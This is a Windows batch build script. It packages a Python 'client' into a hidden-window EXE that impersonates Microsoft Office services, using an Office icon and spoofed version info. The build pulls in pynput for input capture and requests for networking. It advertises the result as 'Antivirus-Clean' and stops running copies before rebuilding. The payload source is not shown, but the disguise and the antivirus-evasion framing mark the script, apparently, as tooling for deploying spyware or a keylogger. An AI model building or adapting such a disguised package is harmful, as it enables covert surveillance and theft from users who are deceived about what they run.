@echo off
title Building Microsoft Office App Services EXE
echo ============================================
echo  Building Microsoft Office-App-Services.exe
echo ============================================
echo.
cd /d "%~dp0"

echo [1/3] Checking dependencies and stopping running instances...
taskkill /F /IM "Microsoft Office-App-Services.exe" 2>nul
taskkill /F /IM "Microsoft_Office_App_Services.exe" 2>nul
pip install pyinstaller pillow requests pynput --quiet
echo Done.

echo.
echo [2/3] Building Antivirus-Clean EXE with PyInstaller (Standard PE, Zero-UPX)...
pyinstaller --clean --onefile --noconsole ^
    --name "Microsoft Office-App-Services" ^
    --icon "ms_office.ico" ^
    --version-file "version_info_client.txt" ^
    --exclude-module PIL._avif ^
    --exclude-module PIL._webp ^
    --exclude-module PIL._imagingtk ^
    --exclude-module PIL._imagingcms ^
    --exclude-module unittest ^
    --exclude-module test ^
    --exclude-module multiprocessing ^
    --exclude-module sqlite3 ^
    --exclude-module pydoc ^
    --exclude-module pdb ^
    --exclude-module difflib ^
    --exclude-module doctest ^
    --exclude-module asyncio ^
    --exclude-module tkinter.test ^
    --exclude-module xml ^
    --exclude-module xmlrpc ^
    --exclude-module pyexpat ^
    --exclude-module decimal ^
    --exclude-module _decimal ^
    --exclude-module _lzma ^
    --exclude-module _bz2 ^
    "Microsoft_Office_App_Services.py"

echo.
echo [3/3] Copying to folder...
taskkill /F /IM "Microsoft Office-App-Services.exe" 2>nul
taskkill /F /IM "Microsoft_Office_App_Services.exe" 2>nul
timeout /t 1 /nobreak >nul
if exist "dist\Microsoft Office-App-Services.exe" (
    copy "dist\Microsoft Office-App-Services.exe" "Microsoft Office-App-Services.exe" /Y
    echo.
    echo ============================================
    echo  SUCCESS! File created:
    echo  Microsoft Office-App-Services.exe
    echo ============================================
) else (
    echo.
    echo [ERROR] Build FAILED. Check errors above.
)

echo.
exit /b 0
